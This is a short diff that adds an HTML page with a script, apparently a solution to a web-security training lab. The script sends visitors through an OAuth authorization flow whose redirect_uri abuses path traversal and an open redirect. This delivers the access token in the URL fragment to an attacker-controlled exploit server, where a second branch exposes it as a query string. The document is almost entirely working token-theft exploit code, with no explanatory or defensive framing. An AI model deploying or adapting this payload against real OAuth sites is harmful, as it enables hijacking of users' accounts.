@@ -1,0 +1,9 @@
+Hello World!
+
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0a3900dc043d411082444af5026c00aa.oauth-server.net/auth?client_id=b796bqey67oycyt87eaph&redirect_uri=https://0ad600bd0495414c825d4cb7007400e9.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac70045048141f9825f4b2a011d00d2.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
